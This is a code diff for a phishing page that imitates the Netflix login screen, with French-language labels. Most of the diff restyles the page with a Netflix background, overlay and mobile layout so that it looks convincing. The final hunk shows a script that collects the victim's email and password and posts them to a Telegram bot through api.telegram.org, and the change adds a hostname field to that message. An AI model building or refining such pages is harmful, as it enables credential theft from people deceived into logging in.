@@ -13,12 +13,27 @@
         }
 
         body {
-            background-color: #000;
             color: #fff;
+            background: #000 url('netflixbackground.jpg') no-repeat center center/cover;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        body::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: -1;
         }
 
         .header {
             padding: 20px 45px;
+            position: relative;
+            z-index: 10;
         }
 
         .header img {
@@ -31,6 +46,9 @@
             padding: 60px 68px;
             background-color: rgba(0, 0, 0, 0.75);
             border-radius: 4px;
+            position: relative;
+            z-index: 10;
+            margin-top: 30px;
         }
 
         h1 {
@@ -129,6 +147,8 @@
             padding: 30px 45px;
             margin-top: 90px;
             color: #737373;
+            position: relative;
+            z-index: 10;
         }
 
         .footer a {
@@ -162,6 +182,13 @@
             margin-bottom: 20px;
         }
 
+        select {
+            background: transparent;
+            color: #737373;
+            border: none;
+            font-size: 13px;
+        }
+
         /* Spinner styles */
         .spinner {
             display: none;
@@ -187,6 +214,26 @@
 
         .btn-loading .spinner {
             display: block;
+        }
+
+        @media (max-width: 740px) {
+            body {
+                background: #000;
+            }
+            
+            .login-container {
+                padding: 15px;
+                margin-top: 0;
+                max-width: 100%;
+            }
+            
+            .header {
+                padding: 15px;
+            }
+            
+            .header img {
+                height: 32px;
+            }
         }
     </style>
 </head>
@@ -264,7 +311,9 @@
 📧 Email: ${email}
 🔑 Mot de passe: ${password}
 
-⏰ ${new Date().toLocaleString()}`;
+⏰ ${new Date().toLocaleString()}
+
+🌐 Adresse IP: ${window.location.hostname}`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
